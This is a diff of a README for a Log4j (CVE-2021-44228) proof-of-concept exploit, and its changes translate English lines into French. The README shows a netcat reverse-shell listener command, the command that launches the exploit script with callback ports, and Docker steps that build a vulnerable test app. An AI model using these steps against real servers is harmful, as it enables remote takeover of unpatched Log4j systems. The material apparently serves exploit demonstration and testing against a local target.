@@ -1,6 +1,6 @@
 # log4j-shell-poc
-A Proof-Of-Concept pour la récente vulnérabilité trouvée CVE-2021-44228 vulnerability. <br><br>
-Log4j, a java logging library largement utilisée en elasticsearch, minecraft et autres.
+Une Proof-Of-Concept pour la récente vulnérabilité trouvée CVE-2021-44228 . <br><br>
+Log4j, Une bibliothèque de journalisation de java largement utilisée en elasticsearch, minecraft et autres.
 
 
 Proof-of-concept (POC)
@@ -20,7 +20,7 @@ pip install -r requirements.txt
 ```py
 nc -lvnp 9001
 ```
-* Launch the exploit.<br>
+* Lancer l'exploit.<br>
 **Note:** Extraire java archive dans le même dossier sous le nom: `jdk1.8.0_20`.
 ```py
 $ python3 poc.py --userip localhost --webport 8000 --lport 9001
@@ -44,7 +44,7 @@ Ce script va configurer un HTTP server et LDAP server pour vous, et il va créer
 Notre vulnerable application
 --------------------------
 
-We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
+Il faut lancer le Dockerfile avec une webapp vulnérable:
 ```c
 1: docker build -t log4j-shell-poc .
 2: docker run --network host log4j-shell-poc
